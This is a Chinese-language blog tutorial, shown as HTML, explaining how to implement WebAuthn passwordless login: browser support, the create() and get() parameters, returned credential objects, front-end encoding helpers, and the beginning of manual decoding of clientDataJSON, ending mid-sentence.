class=\"mdui-table\">\n<thead><tr>\n<th>浏览器</th>\n<th>支持情况</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>桌面端 Chrome</td>\n<td>67+</td>\n</tr>\n<tr>\n<td>移动端 Chrome</td>\n<td>67+<sup>[1]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Firefox</td>\n<td>60+</td>\n</tr>\n<tr>\n<td>移动端 Firefox</td>\n<td>不支持<sup>[2]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Edge</td>\n<td>18+</td>\n</tr>\n<tr>\n<td>移动端 Edge</td>\n<td>不支持<sup>[3]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Safari</td>\n<td>13+</td>\n</tr>\n<tr>\n<td>移动端 Safari</td>\n<td>13.3+<sup>[4]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Opera</td>\n<td>54+</td>\n</tr>\n<tr>\n<td>移动端 Opera</td>\n<td>不支持</td>\n</tr>\n</tbody>\n</table></div>\n<p><sup>[1]</sup> 受平台限制，Chrome 在 iOS 平台上不支持 WebAuthn，在 Android 平台上支持大部分 WebAuthn 功能，但仍不支持部分特性（如 <code>userVerification</code>）。<br><sup>[2]</sup> 移动端 Firefox 80 以下的版本支持 WebAuthn 但似乎会忽略 <code>authenticatorAttachment</code> 等一部分参数，同时移动端 Firefox Beta 80 以下的版本支持 WebAuthn 但无法成功调用。自 80 版本起移动端 Firefox 暂时取消了对 WebAuthn 的支持（可能是 Bug）。<br><sup>[3]</sup> 移动端 Edge 似乎支持 WebAuthn 但无法成功调用。<br><sup>[4]</sup> Safari iOS/iPad OS 13 仅支持外部认证器，无法调用 Touch ID 或 Face ID；自 iOS/iPad OS 14 起 Safari 已支持全功能 WebAuthn，可以调用 Touch ID/Face ID</p>\n<p>当然，一众国产浏览器，包括 Samsung Browser 和 Yandex Browser，目前都不支持 WebAuthn。此外，由于 WebAuthn 涉及外部验证器和 TPM 可信平台模块等，用户的操作系统也会对 WebAuthn 的可用性造成影响。以下是一些需要注意的信息：</p>\n<ul>\n<li>Windows 10 1903 以下版本仅 Edge 能提供完整支持，其他浏览器只能使用 USB Key 等外部认证器；1903+ 中所有浏览器都可以通过 Windows Hello 带来完整的 WebAuthn 支持</li>\n<li>Android 需要安装并开启 Google 服务</li>\n<li>iOS/iPad OS 13.3 以下的版本不支持 WebAuthn，iOS/iPad OS 14 以下的版本支持有限（参考上文），iOS/iPad OS 14 开始 Safari 已支持全功能 WebAuthn（功能完整度甚至超过了 Android）</li>\n</ul>\n<p>可以看出，WebAuthn 的发展之路仍然很漫长，但好在桌面端对它的支持已经比较完善了，在一些情况下我们完全有理由使用它。</p>\n<hr>\n<p>来看看浏览器提供了怎么样的接口吧。要使用 WebAuthn，我们可以使用 <code>navigator.credentials.create()</code> 请求认证器生成公钥凭证和 <code>navigator.credentials.get()</code> 请求获取公钥凭证。</p>\n<blockquote><p>你或许已经对 Credential Management API 有所了解了。通过这些 API，我们还可以实现一些有趣的特性，不过这值得另开一篇文章来讲了。</p></blockquote>\n<p>对于一个基础的实现，<code>navigator.credentials.create()</code> 需要传入的参数如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        challenge,\r\n        rp: {\r\n            id,\r\n            name\r\n        },\r\n        user: {\r\n            id,\r\n            name,\r\n            displayName\r\n        },\r\n        pubKeyCredParams: [\r\n            {\r\n                type: \"public-key\",\r\n                alg\r\n            }\r\n        ],\r\n        authenticatorSelection: {\r\n            authenticatorAttachment,\r\n            userVerification\r\n        },\r\n        excludeCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>在 <code>navigator.credentials.create()</code> 方法中，我们必须传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值。这指明了我们需要创建公钥凭证，而非普通的密码凭证。然后，在 <code>publicKey</code> 对象中设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rp: Object</code>：依赖方信息，其中有一项为必须：\n<ul>\n<li>\n<code>rp.id: String</code>：（可选）依赖方 ID，必须为当前域名或为当前域名的子集的域名（不是子域名）。如域名为 <code>test.123.example.com</code>，则依赖方 ID 可以是 <code>test.123.example.com</code>, <code>123.example.com</code> 或 <code>example.com</code>。不指定则默认使用当前域名</li>\n<li>\n<code>rp.name: String</code>：依赖方名称，用于方便用户辨认</li>\n</ul>\n</li>\n<li>\n<code>user: Object</code>：用户信息，其中有三项为必须：\n<ul>\n<li>\n<code>user.id: Uint8Array</code>：转换为 <code>Uint8Array</code> 的字符串。<strong>出于安全考量，这应尽可能不与任何用户信息相关联，如不要包含用户名、用户邮箱等</strong>\n</li>\n<li>\n<code>user.name: String</code>：登录用户名</li>\n<li>\n<code>user.dispalyName: String</code>：用于显示的用户名称，显示与否的具体行为取决于浏览器</li>\n</ul>\n</li>\n<li>\n<code>pubKeyCredParams: Array</code>：一个算法列表，指明依赖方接受哪些签名算法。列表的每一项都是一个对象，拥有两个属性：\n<ul>\n<li>\n<code>pubKeyCredParams[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>pubKeyCredParams[].alg: Number</code>：一个负整数，用于标明算法。具体算法对应的数字可以在 <a href=\"https://www.iana.org/assignments/cose/cose.xhtml#algorithms\">COSE</a> 找到</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection: Object</code>：（可选）用于过滤正确的认证器，这里介绍常用的一个参数：\n<ul>\n<li>\n<code>authenticatorSelection.authenticatorAttachment: String</code>：（可选）指定要求的认证器类型。如果没有满足要求的认证器，认证可能会失败。该参数可以为 <code>null</code>（表示接受所有类型的认证器）或是以下两个值之一：\n<ul>\n<li>\n<code>platform</code>：表示仅接受平台内置的、无法移除的认证器，如手机的指纹识别设备</li>\n<li>\n<code>cross-platform</code>：表示仅接受外部认证器，如 USB Key</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection.userVerification: String</code>：（可选）指定认证器是否需要验证“用户为本人 (User Verified, UV)”，否则只须“用户在场 (User Present, UP)”。具体验证过程取决于认证器（不同认证器的认证方法不同，也有认证器不支持用户验证），而对验证结果的处理情况则取决于依赖方。该参数可以为以下三个值之一：\n<ul>\n<li>\n<code>required</code>：依赖方要求用户验证</li>\n<li>\n<code>preferred</code>：（默认）依赖方希望有用户验证，但也接受用户在场的结果</li>\n<li>\n<code>discouraged</code>：依赖方不关心用户验证。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>excludeCredentials: Array</code>：（可选）用于标识要排除的凭证，可以避免同一个用户多次注册同一个认证器。如果用户试图注册相同的认证器，用户代理会抛出 <code>InvalidStateError</code> 错误。数组中的每一项都是一个公钥凭证对象，包含以下属性：\n<ul>\n<li>\n<code>excludeCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>excludeCredentials[].id: Uint8Array</code>：要排除的凭证 ID</li>\n<li>\n<code>excludeCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，超时后将强制终止 <code>create()</code> 并抛出错误。若不设置，将使用用户代理的默认值；若太大或太小，则使用最接近的用户代理默认值范围中的值。推荐值为 5000-120000</li>\n</ul>\n<blockquote><p>对于 <code>pubKeyCredParams</code>，通常我们只需添加 ES256 (alg: -7) 算法即可兼容大部分外部认证器，此外，再添加 RS256 (alg: -257) 算法即可兼容大部分平台内置认证器（如 Windows Hello）。当然，前端添加算法之后，后端也需要相应的算法支持。</p></blockquote>\n<blockquote><p>对于 <code>userVerification</code>，由于默认值 “preferred” 并不能很好地被所有设备支持，因此无论在 <code>create()</code> 中还是 <code>get()</code> 中不指定该参数都会在 Chrome 中触发一条警告。具体请参阅<a href=\"https://chromium.googlesource.com/chromium/src/+/master/content/browser/webauth/uv_preferred.md\">这个页面</a>。</p></blockquote>\n<p>调用 <code>create()</code> 之后，我们就可以拿到一个 <code>Promise</code>，并可以在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>create()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAttestationResponse {\r\n        attestationObject: ArrayBuffer(390) {},\r\n        clientDataJSON: ArrayBuffer(121) {}\r\n    },\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\",\r\n    type: \"public-key\"\r\n}</pre>\n<p>其中有：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：<code>AuthenticatorAttestationResponse</code> 对象，是 <code>PublicKeyCredential</code> 的主要部分，包含以下两个内容：\n<ul>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n<li>\n<code>response.attestationObject: ArrayBuffer</code>：CBOR 编码的认证器数据，包含凭证公钥、凭证 ID、签名（如果有）、签名计数等信息</li>\n</ul>\n</li>\n</ul>\n<p>然后将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串，我们就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证与注册了。具体怎么操作，我们会在下文详细讨论。当然，别忘了 <code>catch()</code> 注册过程中抛出的任何错误。</p>\n<blockquote><p>你可能会认为在所有情况下，注册时认证器都会对挑战进行签名。实际上在大部分情况下（同时也是默认情况），<strong>注册时认证器并不会对挑战进行签名</strong>，<code>attestationObject</code> 并不会包含签名后的挑战。只有依赖方明确要求证明且用户同意（部分浏览器要求）后认证器才会对挑战进行签名（具体实现据情况会有所不同）。对此，<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion#Attestation\">MDN 解释道</a>“大部分情况下，用户注册公钥时我们会使用「初次使用时信任模型」(TOFU) ，此时验证公钥是没有必要的。”要了解更多关于证明的内容，请参阅“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>而对于 <code>navigator.credentials.get()</code>，我们可以传入如下的参数：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.get({\r\n    publicKey: {\r\n        challenge,\r\n        rpId,\r\n        userVerification,\r\n        allowCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>和 <code>create()</code> 一样，对于 <code>get()</code> 我们需要传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值，指明我们需要获取的是公钥凭证而非普通的密码凭证。在 <code>publicKey</code> 对象中我们可以设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rpID: String</code>：（可选）依赖方 ID，需要和注册认证器时的一致。规则和上述的 <code>rp.id</code> 一致，不指定默认使用当前域名</li>\n<li>\n<code>userVerification: String</code>：和上文一样，只是需要注意它这次不在 <code>authenticatorSelection</code> 中了</li>\n<li>\n<code>allowCredentials: Array</code>：（可选）用于标识允许的凭证 ID，使用户代理找到正确的认证器。只有符合这个列表中凭证 ID 的凭证才能被成功返回。数组中的每一项都是对象，包含以下属性：\n<ul>\n<li>\n<code>allowCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>allowCredentials[].id: Uint8Array</code>：允许的凭证 ID</li>\n<li>\n<code>allowCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，和上面的一样，推荐值为 5000-120000</li>\n</ul>\n<p>嗯，要传入的参数少多了。之后，和 <code>create()</code> 一样，调用 <code>get()</code> 之后，我们就可以拿到一个 <code>Promise</code> 并在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>get()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAssertionResponse {\r\n        authenticatorData: ArrayBuffer(37) {},\r\n        signature: ArrayBuffer(256) {},\r\n        userHandle: ArrayBuffer(64) {},\r\n        clientDataJSON: ArrayBuffer(118) {}\r\n    }\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\"\r\n    type: \"public-key\"\r\n}</pre>\n<p>这里的东西就比 <code>create()</code> 时拿到的要多了。看看我们拿到了什么吧：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：对于验证流程，认证会返回 <code>AuthenticatorAssertionResponse</code> 而不是 <code>AuthenticatorAttestationResponse</code> 对象，这个对象包含以下 4 个属性：\n<ul>\n<li>\n<code>response.authenticatorData: ArrayBuffer</code>：认证器信息，包含认证状态、签名计数等</li>\n<li>\n<code>response.signature: ArrayBuffer</code>：被认证器签名的 <code>authenticatorData</code> + <code>clientDataHash</code>（<code>clientDataJSON</code> 的 SHA-256 hash）</li>\n<li>\n<code>response.userHandle: ArrayBuffer</code>：<code>create()</code> 创建凭证时的用户 ID <code>user.id</code>。许多 U2F 设备不支持这一特性，这一项将会是 <code>null</code>\n</li>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n</ul>\n</li>\n</ul>\n<p>同样地，我们将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串后就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证了。至于具体怎么做，别急，马上就来讲一讲。</p>\n<h2>简单实现</h2>\n<p>了这么多，我们终于可以实现一个简单的 WebAuthn 认证页面了。由于在实际操作中 WebAuthn 相关的数据解码和密码计算比较复杂，在服务器端我们可以使用第三方库来帮我们做这些脏活累活，我们只需专注于具体流程就可以了。</p>\n<p>要寻找可用的第三方库，你可以在 <a href=\"https://webauthn.io/\">webauthn.io</a> 上找到适用于各种语言的第三方库——除了 PHP（笑）。不过好在你可以在 GitHub 上找到几个不错的 PHP WebAuthn 库，比如 <a href=\"https://github.com/web-auth/webauthn-framework\">web-auth/webauthn-framework</a>。</p>\n<p>在我们的这个例子中，我们关心的主要是前端逻辑；而后端我们可以使用各类几乎已经做到开箱即用的第三方库，这样我们可以专注于流程而不必关心细节。当然如果你想了解后端的解码细节，可以阅读“<a href=\"https://flyhigher.top/#webauthn-decode\">手动解个码</a>”一节。</p>\n<hr>\n<p>让我们先从注册开始吧。现在，用户点击了注册认证器的按钮，一个请求被发送给服务器（也就是依赖方）。在最简单的情况中，依赖方需要将三个内容发送给浏览器：<strong>挑战、用户信息和用户已注册的凭证 ID 列表（即 <code>excludeCredentials</code>）</strong>。当然依赖方也可以自由选择发送更多信息，只要最终前端能构建合法的参数即可。</p>\n<p>挑战最终会被转换为 <code>Uint8Array</code>，即一组 0-255 的整数。如果使用 PHP，在后端我们可以这样生成 Base64 编码的挑战：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$challenge = \"\";\r\nfor($i = 0; $i \n<p>对于用户信息，我们需要登录名、显示名称和 ID 三项内容。我们可以从数据库中取出用户信息，也可以新建一份。需要注意的是，<strong>出于安全和隐私的考量，ID 不应该包含用户的任何信息，比如用户邮箱等。</strong>推荐的做法是和挑战一样，生成一个随机字符串/一组随机数，并将其于用户关联起来以供之后使用。</p>\n<p>发送已注册的凭证 ID 列表是为了防止用户重复注册同一个认证器。正确设置该列表后，如果用户试图注册同一个认证器，浏览器会中止流程并抛出 <code>InvalidStateError</code>。</p>\n<p>最后，别忘了将挑战等一些后续可能会用到的信息临时存储起来。Session 就是一个很好的选择。</p>\n<p>将所有信息发送到浏览器之后，我们应该可以构建出新建凭证所需的参数了。由于有多个参数需要以 <code>Uint8Array</code> 的形式传入，我们可以准备一个简单的工具函数帮我们将 Base64 的字符串转为 <code>Uint8Array</code>。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function str2ab(str){\r\n    return Uint8Array.from(window.atob(str), c=&gt;c.charCodeAt(0));\r\n}</pre>\n<p>除了 <code>challenge</code>, <code>rp</code>, <code>user</code> 和 <code>excludeCredentials</code> 几部分需要你根据具体情况设置外，上文提到的其他参数一般可以这么设置：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">publicKey: {\r\n    challenge, // 自行设置\r\n    rp, // 自行设置\r\n    user, // 自行设置\r\n    pubKeyCredParams: [\r\n        {\r\n            type: \"public-key\",\r\n            alg: -7 // ES256\r\n        },\r\n        {\r\n            type: \"public-key\",\r\n            alg: -257 // RS256\r\n        }\r\n    ],\r\n    authenticatorSelection: {\r\n        userVerification: \"discouraged\",\r\n        authenticatorAttachment: null // 除非用户指定，大部分情况下无需指定\r\n    },\r\n    excludeCredentials, // 自行设置\r\n    timeout: 60000\r\n}</pre>\n<p>然后就是传入 <code>navigator.credentials.create()</code>，拿到 <code>PublicKeyCredential</code>。如果一切顺利，接下来我们就需要考虑如何将返回的内容传回依赖方了。由于我们拿到的很多都是 <code>ArrayBuffer</code>，我们需要将其进行编码。再准备一个工具函数吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function array2b64String(a) {\r\n    return window.btoa(String.fromCharCode(...a));\r\n}</pre>\n<p>然后适当处理，我们就可以得到一个方便传输的 JSON 字符串了：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({publicKey}).then((credentialInfo) =&gt; {\r\n    const publicKeyCredential = {\r\n        id: credentialInfo.id,\r\n        type: credentialInfo.type,\r\n        rawId: array2b64String(new Uint8Array(credentialInfo.rawId)),\r\n        response: {\r\n            clientDataJSON: array2b64String(new Uint8Array(credentialInfo.response.clientDataJSON)),\r\n            attestationObject: array2b64String(new Uint8Array(credentialInfo.response.attestationObject))\r\n        }\r\n    };\r\n    return publicKeyCredential;\r\n}).then(JSON.stringify).then((authenticatorResponseJSON) =&gt; {\r\n    // 可以发送了\r\n}).catch((error) =&gt; {\r\n    console.warn(error); // 捕获错误\r\n})</pre>\n<p>依赖方收到数据以后，还需要做三件事：验证挑战、存储凭证 ID 和存储公钥。如果数据解码顺利，且收到的挑战和之前发送的一致，就可以认为注册成功，将凭证 ID 及公钥与用户关联起来。这一步有很多第三方库可以帮我们做，对于基础实现我们就不深入探究了。</p>\n<blockquote><p>由于不同厂商的认证器的实现方式不同，<strong>我们并不能保证凭证 ID 一定是全局唯一的</strong>，也就是说，凭证 ID 有可能碰撞——即使这些凭证实际上是不同的。依赖方在实现凭证 ID 的存储及查找时，需要注意和用户 ID 结合进行存储或查找，或是直接在注册认证器时在服务器端对比阻止相同的凭证 ID。</p></blockquote>\n<hr><p>接下来就可以进行验证了。某天，用户点击了验证按钮准备登录，于是浏览器发送了验证请求到依赖方，同时附上要登录的用户名。接下来依赖方至少需要发送两项内容给浏览器：<strong>挑战和用户已绑定的凭证 ID 列表（即 <code>allowCredentials</code>）。</strong></p>\n<p>之后前端的处理流程就和注册时基本一致了。只是需要注意验证流程中获取到的 <code>PublicKeyCredential</code> 的结构和注册时的稍有不同。</p>\n<p>当浏览器将数据传回后，依赖方需要做的事情就比之前要麻烦一些了。依赖方需要验证挑战，并用之前存储的公钥验证签名和签名计数。同样地，这一步有很多第三方库可以帮我们做。最后，如果验证全部通过，我们就可以允许用户登录了。</p>\n<p>到目前为止，我们已经实现了一个简单的 WebAuthn 验证服务。不过这只是一个最基础的实现，对于很多高安全要求的身份认证这是远远不够的。因此，我们需要摆脱对第三方库的依赖，深入了解 WebAuthn。你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分，不过对于基础的 WebAuthn 实现，我们的旅程就到这里了。</p>\n<h2>拓展阅读</h2>\n<p>如果你的目标只是快速了解如何开发 WebAuthn，那么你阅读到这里就可以了。同时，上一节例子中的部分代码来自于我为了这篇文章开发的 WordPress 插件 WP-WebAuthn，这个插件可以为你的 WordPress 启用 WebAuthn 无密码登录（并非二步验证），你可以查阅插件的 <a href=\"https://github.com/yrccondor/wp-webauthn\">GitHub 存储库</a>了解更多，也可以自己安装试一试。</p>\n<p>如果你正在使用 Chrome 开发，Chrome 87+ 版本添加了一个 WebAuthn 开发者面板，可以帮助你在没有任何实体验证器的情况下开发 WebAuthn 功能。你可以在 Google 的<a href=\"https://developers.google.com/web/tools/chrome-devtools/webauthn\">这篇文章</a>中了解更多。不够，如果你正在使用 Firefox，很遗憾目前我还没有找到对应的开发工具或是浏览器扩展可用。</p>\n<p>如果你希望了解更多关于非对称加密的数学证明，可以查阅阮一峰老师的<a href=\"http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html\">这篇文章</a>。</p>\n<p>如果你希望了解更多关于 Credential Management API 的信息，可以查阅<a href=\"https://medium.com/dev-channel/sign-in-on-the-web-credential-management-api-and-best-practices-d21aed14b6fe\">这篇文章</a>（英文）。</p>\n<p>如果你希望了解更多 WebAuthn 的细节，可以继续往下阅读。<span></span></p>\n<h1>深入了解 WebAuthn</h1>\n<p>如上文所说，如果摆脱对第三方库的依赖，或是要实现更安全的 WebAuthn，我们必须深入了解 WebAuthn。在这一部分中，我们会详细讨论上文没有提到的一些概念和参数，并了解 WebAuthn 中各类数据的结构以实现解码与验证。先来看一看一些进阶的选项吧。</p>\n<h2>进阶选项</h2>\n<p>没错，上文提到的传入 <code>navigator.credentials.create()</code> 和 <code>navigator.credentials.get()</code> 方法的参数其实只是所有参数的一部分。对于 <code>create()</code>，我们还可以配置这些可选内容（上文提及的已省略）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        rp: {\r\n            icon\r\n        },\r\n        user: {\r\n            icon\r\n        },\r\n        attestation,\r\n        authenticatorSelection: {\r\n            requireResidentKey\r\n        },\r\n        extensions\r\n    }\r\n})</pre>\n</pre>\n<ul>\n<li>\n<code>rp.icon: String</code> 和 <code>user.icon</code>：是的，你可以为依赖方和用户设置图标，可以使用 HTTPS URL 或 Base64，一般长度不能超过 128 字节，不过大部分浏览器不会显示图标，或是有非常小的图片体积限制，所以一般没有使用这一属性的必要</li>\n<li>\n<code>attestation: String</code>：表明依赖方是否需要证明。可选三个值：\n<ul>\n<li>\n<code>none</code>：（默认）不需要证明。如上文所述，依赖方不关心证明，因此认证器不会签名。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n<li>\n<code>indirect</code>：依赖方需要证明，但证明方式可由认证器选择。在支持匿名证明的认证器上，认证器会通过匿名证明的方式签名挑战，并向依赖方提供签名方式等信息</li>\n<li>\n<code>direct</code>：依赖方要求直接证明。此时认证器会使用烧录在认证器中的公钥进行签名，同时向依赖方提供签名方式等信息以供依赖方验证认证器是否可信。更多信息可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节</li>\n</ul>\n</li>\n<li>在 <code>authenticatorSelection</code> 中，我们还可以设置两个可选属性：\n<ul>\n<li>\n<code>authenticatorSelection.requireResidentKey: Boolean</code>：是否要求将私钥钥永久存储于认证器中。默认值为 <code>false</code>。对于 iOS/iPad OS 13，必须设置为 <code>false</code>，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n<li>\n<code>extensions: Object</code>：WebAuthn 扩展，可以提供规范之外的配置和响应。由于实际情况中很少会使用这一特性，我们不会在这篇文章中讨论它</li>\n\n<blockquote><p>将 <code>requireResidentKey</code> 设置为 <code>true</code> 可以实现无用户名的登录，即认证器同时替代了用户名和密码。需要注意的是，尽管大部分认证器可以实现无限对公私钥，<strong>但能永久存储的私钥数量是有限的</strong>（对于 Yubikey，这通常是 25），因此只应在真正需要的时候启用此特性。我们会在“<a href=\"https://flyhigher.top/#login-without-username\">无用户名登录</a>”一节中详细讨论原因。</p></blockquote>\n<blockquote><p><strong>如果你没有高安全需求（如银行交易等），请不要向认证器索取证明</strong>，即将 <code>attestation</code> 设置为 \"none\"。对于普通身份认证来说，要求证明不必要的，且会有浏览器提示打扰到用户。</p></blockquote>\n<blockquote><p>Android 暂时无法实施用户验证，进而会导致依赖方验证失败。你可以在<a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=997538\">这里</a>追踪这个特性的实现情况。</p></blockquote>\n<blockquote>\n<p>对于 <code>extensions</code>，由于目前浏览器支持和应用范围有限，我们不会在这篇文章中涉及，不过你可以看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    uvm: true, // 要求认证器返回用户进行验证的方法\r\n    txAuthSimple: \"Please proceed\" // 在认证器上显示与交易有关的简短消息\r\n}</pre>\n<p>你可以在<a href=\"https://www.w3.org/2019/01/webauthn-extensions.html\">这个页面</a>了解更多关于 <code>extensions</code> 的信息。</p>\n</blockquote>\n<p>对于 <code>get()</code>，我们其实只有一个可选内容没讲了，即 <code>extensions</code>。和上文一样，我们不会在这篇文章中讨论它。</p>\n<p>就这些了！<span></span></p>\n<h2>手动解个码</h2>\n<p>是时候看看如何手动解码了。我们将会在这一节中讨论认证器返回的数据的结构以及如何正确地解码它们。</p>\n<p>首先我们来看看如何处理注册过程中认证器发回的数据。假设所有 <code>ArrayBuffer</code> 类型的值都被正确地以 Base64 编码，且后端已经将 JSON 的字符串解析为字典。先来复习一下，我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"ZRBkDBCEtq...9XY8atOcbg\",\r\n    type: \"public-key\",\r\n    rawId: \"ZRBkDBCEtq...9XY8atOcbg==\",\r\n    response: {\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...i5jcmVhdGUifQ==\",\r\n        attestationObject: \"o2NmbXRkbm9uZWd...xNHuAMzz2LxZA==\"\r\n    }\r\n}</pre>\n<p>这里的 <code>id</code> 就是凭证的 ID，如果验证正确，我们最终要将它存储起来并于用户关联。同时可以看到 Base64 编码后的 <code>rawId</code> 其实和 <code>id</code> 是一致的（不过 <code>id</code> 是 Base64URL 编码的）。而 <code>type</code> 则一定是 \"public-key\"。</p>\n<p>不过，我们主要关心的还是 <code>respose</code> 中的两项内容。首先是 <code>clientDataJSON</code>。它的处理比较简单，看名字就知道，它应该是一个 JSON 字符串。</p>\n<blockquote><p>小技巧：如果你看到一个 Base64 编码的字符串以 \"ey\" 开头，那么它大概率是一个 Base64 编码的 JSON。</p></blockquote>\n<p>将<code>clientDataJSON</code> Base64 解码再 JSON 解码之后我们就能得到一个字典：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"NI4i1vsNmP2KHcmyFnBCKRVQPfHgg34SsYZUOPZY2lM\",\r\n    extra_keys_may_be_added_here: \"do not compare clientDataJSON against a template. See https://goo.gl/yabPex\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>结构一目了然。在这里，我们需要验证三项内容：</p>\n<ul>\n<li>\n<code>challenge</code> 和之前发送的一致</li>\n<li>\n<code>origin</code> 为创建凭证的页面的源（协议+主机名+端口号，并非 URL）</li>\n<li>\n<code>type</code> 为 \"webauthn.create\"</li>\n</ul>\n<p>同时可以注意到有一个奇怪的 <code>extra_keys_may_be_added_here</code>。这其实是 Google 在 Chrome 中搞的一点小把戏，有一定概率会出现，提醒我们需要将 JSON 解析后再验证键值以防额外插入的键值影响验证。具体信息你可以访问那个 URL 看一看。</p>\n<p>对于 Firefox，我们会多得到两项 <code>clientExtensions</code> 和 <code>hashAlgorithm</code> ，分别指明了客户端扩展数据和签名算法。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"3-4\">{\r\n    challenge: \"dg6ost6ujhAA0g6WqLe-SOOH-tbhvjW9Sp90aPKlLJI\",\r\n    clientExtensions: {},\r\n    hashAlgorithm: \"SHA-256\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>由于本文不考虑扩展数据，因此我们可以不考虑 <code>clientExtensions</code>。同时由于目前规范中指定的签名算法只有 SHA-256 